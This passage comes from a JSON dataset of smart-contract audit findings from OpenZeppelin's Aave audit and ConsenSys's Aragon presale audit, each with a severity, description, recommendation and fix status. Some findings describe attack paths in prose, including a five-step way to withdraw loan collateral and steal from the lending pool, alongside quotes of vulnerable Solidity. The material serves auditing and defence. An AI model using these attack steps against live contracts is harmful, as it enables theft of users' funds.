      "summary": "\nThe `rebalanceFixedBorrowRate` function of the `LendingPool` contract is intended to allow anyone to rebalance the fixed interest rate of a borrower when certain requirements are met. However, when querying the borrow balances, the function calls the `getUserBorrowBalances` function mistakenly passing `msg.sender` as the argument. This has resulted in two attack vectors where malicious borrowers can exploit this vulnerability to manipulate another borrowers borrow balance or distort their own accrued interest. \n\nTo prevent malicious borrowers from exploiting this vulnerability, the argument passed to the `getUserBorrowBalances` function should be replaced with `_user`. This issue is closely tied to the critical issue Fixed-rate loans can be repeatedly rebalanced and high severity issue It is impossible to rebalance another accounts fixed borrow rate. This has been fixed in Merge Request #61.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11594",
      "title": "[C03] Deposits not marked as collateral can still be liquidated",
      "impact": "HIGH",
      "content": "When a user [deposits](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L90) an asset into the lending pool, they can choose whether the asset functions as collateral by means of the [`_useAsCollateral` flag](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L93). While the expected behavior is that only assets marked as collateral can be liquidated, this restriction is not enforced.\n\n\nThe issue is due to a logic flaw in the [`liquidationCall` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L72). This function should require that the reserve is enabled as collateral and the user has marked that reserve as collateral. However, the conditional statement in [lines 92 and 93](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L92-93) is erroneous. Consequently, assuming the other liquidation requirements hold, `liquidationCall` succeeds when either:\n\n\n* The reserve `_collateral` is enabled as collateral (regardless of the user preference)\n* The reserve `_collateral` is not enabled as collateral and the user did not mark it as collateral\n\n\nConsider modifying the conditional statement in lines 92 and 93 to `core.isReserveUsageAsCollateralEnabled(_collateral) &amp;&amp;core.isUserUseReserveAsCollateralEnabled(_collateral, _user);`. Afterwards, implementing thorough related unit tests is highly advisable.\n\n\n**Update**: *Fixed in [MR#59](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/59/diffs). Specific unit tests covering this case are still missing.*",
      "summary": "\nThis bug report is about an issue in the `liquidationCall` function of the LendingPoolLiquidationManager.sol contract. The issue is due to a logic flaw in the function, where the conditional statement in lines 92 and 93 is erroneous. This means that the expected behavior of only allowing assets marked as collateral to be liquidated is not enforced, as the function succeeds even when the reserve is not enabled as collateral and the user did not mark it as collateral. \n\nThe recommended solution is to modify the conditional statement in lines 92 and 93 to `core.isReserveUsageAsCollateralEnabled(_collateral) &amp;&amp;core.isUserUseReserveAsCollateralEnabled(_collateral, _user);`, and to implement thorough related unit tests. \n\nThe issue has since been fixed in Merge Request #59, but specific unit tests covering this case are still missing.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11593",
      "title": "[C02] Borrowers can avoid liquidation",
      "impact": "HIGH",
      "content": "When a loan is liquidated, the [reduction in the remaining principal](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L152) and the corresponding reduction in the total borrows (either [fixed](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L144) or [variable](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L146)) is calculated by subtracting the accrued interest from the amount to be repaid.\n\n\nConceptually, this is a combination of two separate operations: the accrued interest is added to the principal when constructing the new loan and then the amount repaid is subtracted. However, combining them into a single operation will cause the transaction to revert whenever the repayment is less than the accrued interest.\n\n\nIn addition to preventing valid repayments, this behavior could be exploited by borrowers to prevent liquidation.\n\n\nSince the size of each liquidation transaction is [restricted by the amount of collateral that can be recovered](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L119-125) from the specified reserve, a borrower could spread their collateral across many different assets in order to ensure the maximum liquidation amount is lower than their accrued interest.\n\n\nAlternatively, the liquidation amount is also [restricted by the protocols close factor](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L108), which means a user could simply allow their loan to grow until the interest exceeds this threshold. In practice, this will likely take years to occur.\n\n\nIn either case, when a borrower cannot be liquidated they no longer have any incentive to remain collateralized.\n\n\nConsider updating the principal and total borrows variables in two independent steps that account for the accrued interest and the loan repayment respectively.\n\n\n**Update**: *Fixed in [MR#56](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/56/diffs) and [MR#58](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/58/diffs). The principal and total borrows are updated in two steps.*",
      "summary": "\nThis bug report is about the liquidation process of a loan. When a loan is liquidated, the reduction in the remaining principal and the corresponding reduction in the total borrows is calculated by subtracting the accrued interest from the amount to be repaid. This is a combination of two separate operations, but combining them into a single operation causes the transaction to revert whenever the repayment is less than the accrued interest. This could be exploited by borrowers to prevent liquidation by spreading their collateral across many different assets or by allowing their loan to grow until the interest exceeds a certain threshold. To fix this issue, the principal and total borrows are updated in two steps. This bug was fixed in Merge Requests 56 and 58.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11592",
      "title": "[C01] Users can steal funds",
      "impact": "HIGH",
      "content": "Whenever users deposit assets into a particular reserve, they choose whether the assets can be used as collateral against future loans, in addition to earning interest. This decision is [stored as a flag in a `UserReserveData` object](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L104) that handles the association between a particular account and reserve contract. However, if the user already has deposits in the same reserve, the existing flag is simply overwritten. This can be leveraged by malicious users to unlock and withdraw any collateral, even if it is required to secure a loan.\n\n\nThe identified attack vector goes as follows:\n\n\n1. A user [deposits assets](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L90) into a reserve with the `_useAsCollateral` flag set to true, [receiving aTokens](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L108) in exchange.\n2. They [borrow assets](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L175) from a different reserve, using the original deposits as collateral. At this stage, they cannot transfer their `aTokens`, since the [`balanceDecreaseAllowed` function](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L160) would return `false`, causing the [`isTransferAllowed` check](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L146-150) to fail.\n3. Next, they deposit any number of assets (even zero) into the initial reserve with the `_useAsCollateral` flag set to `false`.\n4. Now the user can successfully transfer their `aTokens` to a fresh account, since the `balanceDecreaseAllowed` function will [bypass the insolvency check](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolDataProvider.sol#L170-172) and return `true`.\n5. They can now [redeem](https://gitlab.com/aave-tech/dlp/contracts/tree/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/tokenization/AToken.sol#L73) (or sell) the `aTokens` to receive their original collateral. At this point they have taken a loan with no collateral, effectively stealing from the lending pool.\n\n\nConsider preventing users from setting the `_useAsCollateral` flag to `false` when their existing deposits in the reserve are required to secure an outstanding loan. Once the fix is applied, related unit tests are in order to avoid reintroducing this critical issue in future modifications to the code base.\n\n\n**Update**: *Fixed in [MR#38](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/38/diffs). Users can no longer choose whether deposits are considered collateral. Instead, when the users balance in the reserve is zero, the `deposit` function will now default to mark the next deposit in the reserve as collateral. Users can opt-out by calling the `setUserUseReserveAsCollateral` function of the `LendingPool` contract, which performs the appropriate solvency checks. We suggest better documenting this scenario to avoid unexpected behaviors. Additionally, the event `ReserveUsedAsCollateralEnabled` should be emitted in the `deposit` function after calling the `setUserUseReserveAsCollateral` function of the `LendingPoolCore` contract.*",
      "summary": "\nA bug was reported in the Aave platform that allowed malicious users to unlock and withdraw any collateral, even if it was required to secure a loan. This was possible by depositing assets into a reserve with the `_useAsCollateral` flag set to true, receiving aTokens in exchange, and then borrowing assets from a different reserve, using the original deposits as collateral. The malicious user would then deposit any number of assets (even zero) into the initial reserve with the `_useAsCollateral` flag set to `false`. This would allow them to transfer their `aTokens` to a fresh account, and then redeem (or sell) the `aTokens` to receive their original collateral, effectively stealing from the lending pool.\n\nThe bug was fixed in Merge Request #38, where users can no longer choose whether deposits are considered collateral. Instead, when the users balance in the reserve is zero, the `deposit` function will now default to mark the next deposit in the reserve as collateral. Users can opt-out by calling the `setUserUseReserveAsCollateral` function of the `LendingPool` contract, which performs the appropriate solvency checks. Additionally, the event `ReserveUsedAsCollateralEnabled` should be emitted in the `deposit` function after calling the `setUserUseReserveAsCollateral` function of the `LendingPoolCore` contract. It is recommended that this scenario is better documented to avoid unexpected behaviors in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13909",
      "title": "EOPBCTemplate - EtherTokenConstant is never used Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by removing the `EtherTokenConstant` dependency.\n\n\n#### Description\n\n\nThe constant value `EtherTokenConstant.ETH` is never used.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L3**\n\n\n\n```\nimport \"@aragon/os/contracts/common/EtherTokenConstant.sol\";\n\n```\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L21**\n\n\n\n```\ncontract EOPBCTemplate is EtherTokenConstant, BaseTemplate {\n\n```\n#### Recommendation\n\n\nRemove all references to `EtherTokenConstant`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13908",
      "title": "EOPBCTemplate - Keep the template as closely aligned to the audited Company DAO-Template provided by Aragon Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe issue was addressed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) changing the main deployment method from `installFundraisingApps` to `newInstance` aligned with the Aragon/DAO-templates naming.\n\n\n#### Description\n\n\nThe EOPBCTemplate is a simplified variant of the [AragonBlack/FundraisingMultisigTemplate](https://github.com/AragonBlack/fundraising/blob/a51b246507af7b17ec65a9961bff6d9b8e75b7c6/templates/multisig/contracts/FundraisingMultisigTemplate.sol). The FundraisingMultisigTemplate is initially based on the [Aragon/DAO-templates/company-board](https://github.com/aragon/dao-templates/tree/master/templates/company-board) template.\n\n\nPlease note that the DAO-templates provided by Aragon have [recently](https://github.com/ConsenSys/aragon-daotemplates-audit-report-2019-08) been audited.\n\n\nThe EOPBCTemplate is similar to the setup established with [Aragon/DAO-templates/company](https://github.com/aragon/dao-templates/tree/master/templates/company). The scenario deploys in one step. However, interface names are different to the audited DAO-template variant (`installFundraisingApps` vs `newInstance`). We recommend the template and interface names to be kept as close as possible to the audited `company` template which established the entry point for deploying a one-step template as `newInstance`.\n\n\n#### Recommendation\n\n\nTake the [Aragon/DAO-templates/company](https://github.com/aragon/dao-templates/tree/master/templates/company) template as a starting point and add relevant parts for the presale variant.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13907",
      "title": "EOPBCTemplate - inconsistent storage location declaration Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by adding the missing storage location declaration.\n\n\n#### Description\n\n\n`_cacheFundraisingParams()` does not explicitly declare the return value memory location.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L273-L286**\n\n\n\n```\nfunction \\_cacheFundraisingParams(\n    address       \\_owner,\n    string        \\_id,\n    ERC20         \\_collateralToken,\n    MiniMeToken   \\_bondedToken,\n    uint64        \\_period,\n    uint256       \\_exchangeRate,\n    uint64        \\_openDate,\n    uint256       \\_reserveRatio,\n    uint256       \\_batchBlocks,\n    uint256       \\_slippage\n)\n    internal\n    returns (FundraisingParams fundraisingParams)\n\n```\n`_cacheFundraisingApps()` explicitly declares to return a copy of the storage struct.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L254-L271**\n\n\n\n```\nfunction \\_cacheFundraisingApps(\n    Agent          \\_reserve,\n    Presale        \\_presale,\n    MarketMaker    \\_marketMaker,\n    Tap            \\_tap,\n    Controller     \\_controller,\n    TokenManager   \\_tokenManager\n)\n    internal\n    returns (FundraisingApps memory fundraisingApps)\n{\n    fundraisingApps.reserve            = \\_reserve;\n    fundraisingApps.presale            = \\_presale;\n    fundraisingApps.marketMaker        = \\_marketMaker;\n    fundraisingApps.tap                = \\_tap;\n    fundraisingApps.controller         = \\_controller;\n    fundraisingApps.bondedTokenManager = \\_tokenManager;\n}\n\n```\n#### Recommendation\n\n\nStorage declarations should be consistent.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13906",
      "title": "EOPBCTemplate - Pool should be Agent or Reserve Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by replacing `Pool` for `Reserve` in the documentation.\n\n\n#### Description\n\n\nThe documentation refers to an non-existent `Pool` application.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/README.md:L58-L68**\n\n\n\n```\n| App  | Permission             | Grantee          | Manager          |\n| ---- | ---------------------- | ---------------- | ---------------- |\n| Pool | SAFE\\_EXECUTE           | Owner            | Owner            |\n| Pool | ADD\\_PROTECTED\\_TOKEN    | Controller       | Owner            |\n| Pool | REMOVE\\_PROTECTED\\_TOKEN | NULL             | NULL             |\n| Pool | EXECUTE                | NULL             | NULL             |\n| Pool | DESIGNATE\\_SIGNER       | NULL             | NULL             |\n| Pool | ADD\\_PRESIGNED\\_HASH     | NULL             | NULL             |\n| Pool | RUN\\_SCRIPT             | NULL             | NULL             |\n| Pool | TRANSFER               | MarketMaker      | Owner            |\n\n\n```\n#### Recommendation\n\n\n`Pool` should be `Agent` or `Reserve`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13905",
      "title": "EOPBCTemplate - misleading method names _cacheFundraisingApps and _cacheFundraisingParams Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`0ce7c72`](https://github.com/aragonone/fundraising/pull/4/commits/0ce7c724de9c9e92a479f6b1c8b20405957e3d50) by renaming the functions.\n\n\n#### Description\n\n\nThe methods `_cacheFundraisingApps` and `_cacheFundraisingParams` suggest that parameters are cached as state variables in the contract similar to the multi-step deployment contract used for AragonBlack/Fundraising. However, the methods are just returning memory structs.\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L254-L300**\n\n\n\n```\nfunction \\_cacheFundraisingApps(\n    Agent          \\_reserve,\n    Presale        \\_presale,\n    MarketMaker    \\_marketMaker,\n    Tap            \\_tap,\n    Controller     \\_controller,\n    TokenManager   \\_tokenManager\n)\n    internal\n    returns (FundraisingApps memory fundraisingApps)\n{\n    fundraisingApps.reserve            = \\_reserve;\n    fundraisingApps.presale            = \\_presale;\n    fundraisingApps.marketMaker        = \\_marketMaker;\n    fundraisingApps.tap                = \\_tap;\n    fundraisingApps.controller         = \\_controller;\n    fundraisingApps.bondedTokenManager = \\_tokenManager;\n}\n\nfunction \\_cacheFundraisingParams(\n    address       \\_owner,\n    string        \\_id,\n    ERC20         \\_collateralToken,\n    MiniMeToken   \\_bondedToken,\n    uint64        \\_period,\n    uint256       \\_exchangeRate,\n    uint64        \\_openDate,\n    uint256       \\_reserveRatio,\n    uint256       \\_batchBlocks,\n    uint256       \\_slippage\n)\n    internal\n    returns (FundraisingParams fundraisingParams)\n{\n    fundraisingParams = FundraisingParams({\n        owner:           \\_owner,\n        id:              \\_id,\n        collateralToken: \\_collateralToken,\n        bondedToken:     \\_bondedToken,\n        period:          \\_period,\n        exchangeRate:    \\_exchangeRate,\n        openDate:        \\_openDate,\n        reserveRatio:    \\_reserveRatio,\n        batchBlocks:     \\_batchBlocks,\n        slippage:        \\_slippage\n    });\n}\n\n```\n#### Recommendation\n\n\nThe functions are only called once throughout the deployment process. The structs can therefore be created directly in the main method. Otherwise rename the functions to properly reflect their purpose.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13904",
      "title": "BalanceRedirectPresale - setPeriod uint64 overflow in validation check Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by performing the addition using `SafeMath`.\n\n\n#### Description\n\n\n`setPeriod()` allows setting an arbitrary Presale starting date. The method can be called by an entity with the `OPEN_ROLE` permission. Providing a large enough value for `uint64 _period` can overflow the second input validation check. The result is unwanted behaviour where for relatively large values of `period` the require might fail because the overflow `openDate + _period` is less than or equal the current timestamp (`getTimestamp64()`) but if high enough it still might succeed because `openDate + _period` is higher than the current timestamp. The overflow has no effect on the presale end as it is calculated against `_timeSinceOpen`.\n\n\n**code/fundraising/apps/presale/contracts/BalanceRedirectPresale.sol:L253-L257**\n\n\n\n```\nfunction \\_setPeriod(uint64 \\_period) internal {\n    require(\\_period > 0, ERROR\\_TIME\\_PERIOD\\_ZERO);\n    require(openDate == 0 || openDate + \\_period > getTimestamp64(), ERROR\\_INVALID\\_TIME\\_PERIOD);\n    period = \\_period;\n}\n\n```\n![aragon_fundraising_presale]()![aragon_fundraising_presale](https://user-images.githubusercontent.com/2865694/69815349-6148a800-11f6-11ea-871f-18405deb9899.png)\n\n\n#### Recommendation\n\n\nUse `SafeMath` which is already imported to protect from overflow scenarios.",
      "summary": "\nThis bug report is about the `setPeriod()` method in the BalanceRedirectPresale.sol contract, which allows setting a Presale starting date. The method can be called by an entity with the `OPEN_ROLE` permission, however, providing a large enough value for `uint64 _period` can cause an overflow in the second input validation check. This can lead to unexpected behaviour when the overflow results in a `openDate + _period` that is less than or equal to the current timestamp (`getTimestamp64()`).\n\nTo fix this bug, the code was updated with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by performing the addition using `SafeMath`. This helps protect from overflow scenarios.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13903",
      "title": "BalanceRedirectPresale - Tokens vest during the Presale phase Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe issue was addressed with the following statement:\n\n\n\n> \n> This presale version is intended to be used along with the Externally Owned Presale and Bonding Curve Template, which doesnt have a Voting app, therefore contributors doesnt have any voting power.\n> The use case is the deployment of Aragon Network Jurors Token (ANJ) for the Aragon Court, which is not going to be active before the presale starts, so we dont see any potential issue here.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nTokens are directly minted and assigned to contributors during the Presale. While this might not be an issue if the minted token does not give any voting power of some sort in a DAO it can be a problem for scenarios where contributors get stake in return for contributions.\n\n\n#### Recommendation\n\n\nVest tokens for contributors after the presale finishes. In case this is the expected we suggest to add a note to the documentation to make potential users aware of this behaviour that might have security implications if contributors get stake in return for their investments.",
      "summary": "\nThis bug report concerns the presale version of a token that is intended to be used with the Externally Owned Presale and Bonding Curve Template. The issue is that tokens are directly minted and assigned to contributors during the presale, which could be a problem if the minted token gives voting power in a Decentralized Autonomous Organization (DAO). The resolution is that tokens should be vested for contributors after the presale finishes. It is recommended that a note be added to the documentation to make potential users aware of this behavior, as it could have security implications if contributors get stake in return for their investments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13902",
      "title": "Repository structure - Create a clean repository containing one Aragon Application unless changes are contributed upstream Deferred",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe issue has been deferred pending internal discussion.\n\n\n#### Description\n\n\nThe repository is a fork of [AragonBlack/fundraising](https://github.com/AragonBlack/fundraising). The main development repository for Aragon Fundraising is the origin repository at AragonBlock. This repository duplicates a state of the upstream repository that can quickly get out of sync and therefore hard to maintain.\n\n\nIt is unclear if both repositories will live side-by-side or if the `BalanceRedirectPresale` variant is contributed upstream.\n\n\n#### Recommendation\n\n\nIn case changes are not planned to be contributed upstream it is recommended to create a clean Aragon Application from scratch removing any unused or duplicated files.",
      "summary": "\nThis bug report concerns the repository of Aragon Fundraising, which is a fork of AragonBlack/fundraising. The issue is that the main development repository for Aragon Fundraising is the origin repository at AragonBlock, which can quickly get out of sync with the fork and become hard to maintain. It is unclear if both repositories will live side-by-side or if the `BalanceRedirectPresale` variant is contributed upstream. \n\nThe resolution of this bug report is that it has been deferred pending internal discussion. The recommendation is that, if changes are not planned to be contributed upstream, it is recommended to create a clean Aragon Application from scratch, removing any unused or duplicated files.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13901",
      "title": "BalanceRedirectPresale - Presale can be extended indefinitely Won't Fix",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue was addressed with the following statement:\n\n\n\n> \n> It is a very reasonable concern, but this is the intended behavior. That modification is permissioned and that `OPEN_ROLE` is going to be held by the Aragon Network Dao, so we expect a reasonable use of it. We may document it and make it clear that this is possible.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe `OPEN_ROLE` can indefinitely extend the Presale even after users contributed funds to it by adjusting the presale period. The period might be further manipulated to avoid that token trading in the MarketMaker is opened.\n\n\n**code/fundraising/apps/presale/contracts/BalanceRedirectPresale.sol:L136-L138**\n\n\n\n```\nfunction setPeriod(uint64 \\_period) external auth(OPEN\\_ROLE) {\n    \\_setPeriod(\\_period);\n}\n\n```\n**code/fundraising/apps/presale/contracts/BalanceRedirectPresale.sol:L253-L257**\n\n\n\n```\nfunction \\_setPeriod(uint64 \\_period) internal {\n    require(\\_period > 0, ERROR\\_TIME\\_PERIOD\\_ZERO);\n    require(openDate == 0 || openDate + \\_period > getTimestamp64(), ERROR\\_INVALID\\_TIME\\_PERIOD);\n    period = \\_period;\n}\n\n```\n#### Recommendation\n\n\nDo not allow to extend the presale after funds have been contributed to it or only allow period adjustments in `State.PENDING`.",
      "summary": "\nThis bug report is about the `OPEN_ROLE` in the BalanceRedirectPresale smart contract. This `OPEN_ROLE` can be used to indefinitely extend the Presale period, even after users have contributed funds to it. This could be manipulated to prevent token trading in the MarketMaker from being opened. The recommendation is to not allow the period to be extended after funds have been contributed, or to only allow period adjustments in `State.PENDING`. This issue was addressed with the statement that it is reasonable behavior and that the `OPEN_ROLE` is held by the Aragon Network Dao, and that it may be documented to make it clear that this is possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne  Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13900",
      "title": "EOPBCTemplate - AppId of BalanceRedirectPresale should be different from AragonBlack/Presale namehash to avoid collisions Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailprotected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by generating a unique APMNameHash for `BalanceRedirectPresale` that does not collide with the one from `Presale`.\n\n\n#### Description\n\n\nThe template references the new presale contract with `apmNamehash` `0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5`. However, this namehash is already used by the aragonBlack/Presale contract. To avoid confusion and collision a unique `apmNamehash` should be used for this variant of the contract.\n\n\nNote that the contract that is referenced from an `apmNamehash` is controlled by the `ENS` resolver that is configured when deploying the template contract. Using the same namehash for both variants of the contract does not allow a single registry to simultaneously provide both variants of the contract and might lead to confusion as to which application is actually deployed. This also raises the issue that the `ENS` registry must be verified before actually using the contract as a malicious registry could force the template to deploy potentially malicious applications.\n\n\n##### aragonOne/Fundraising:\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L32**\n\n\n\n```\nbytes32   private constant PRESALE\\_ID                    = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;\n\n```\n##### aragonBlack/Fundraising:\n\n\n**templates/multisig/contracts/FundraisingMultisigTemplate.sol:L35**\n\n\n\n```\nbytes32   private constant PRESALE\\_ID             = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;\n\n```\n`bytes32 private constant PRESALE_ID = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;`\n\n\n#### Recommendation\n\n\nCreate a new `apmNamehash` for `BalanceRedirectPresale`.",
